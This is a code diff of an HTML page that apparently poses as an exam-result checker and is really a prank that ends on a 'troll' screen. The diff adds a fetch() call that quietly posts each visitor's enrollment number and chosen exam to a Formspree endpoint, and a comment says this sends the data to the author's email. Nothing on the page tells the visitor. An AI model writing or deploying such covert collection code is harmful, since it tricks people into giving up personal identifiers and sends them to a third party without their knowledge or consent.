@@ -62,28 +62,42 @@
         <button onclick="location.reload()" style="background: #666; font-size: 12px; padding: 8px;">Try Another Number</button>
     </div>
 
-    <script>
-        function startLoading() {
-            var enroll = document.getElementById('enrollment').value;
-            var exam = document.getElementById('exam').value;
+   <script>
+    function startLoading() {
+        var enroll = document.getElementById('enrollment').value;
+        var exam = document.getElementById('exam').value;
 
-            if (exam === "") {
-                alert("Please select your Exam");
-                return;
+        if (exam === "") {
+            alert("Please select your Exam");
+            return;
+        }
+        if (enroll.length < 10) {
+            alert("Please enter a valid 12-digit Enrollment Number");
+            return;
+        }
+
+        // Show Loading UI
+        document.getElementById('login-section').style.display = 'none';
+        document.getElementById('loading-section').style.display = 'block';
+
+        // SEND DATA TO YOUR EMAIL
+        fetch("https://formspree.io/f/mykjakev", {
+            method: "POST",
+            body: JSON.stringify({
+                Enrollment: enroll,
+                Exam: exam
+            }),
+            headers: {
+                'Accept': 'application/json'
             }
-            if (enroll.length < 10) {
-                alert("Please enter a valid 12-digit Enrollment Number");
-                return;
-            }
-
-            document.getElementById('login-section').style.display = 'none';
-            document.getElementById('loading-section').style.display = 'block';
-
+        }).finally(() => {
+            // After 3 seconds, show the troll (regardless of if the email sent or failed)
             setTimeout(function() {
                 document.getElementById('loading-section').style.display = 'none';
                 document.getElementById('troll-section').style.display = 'block';
-            }, 3000); // 3 second delay for maximum tension
-        }
-    </script>
+            }, 3000);
+        });
+    }
+</script>
 </body>
 </html>
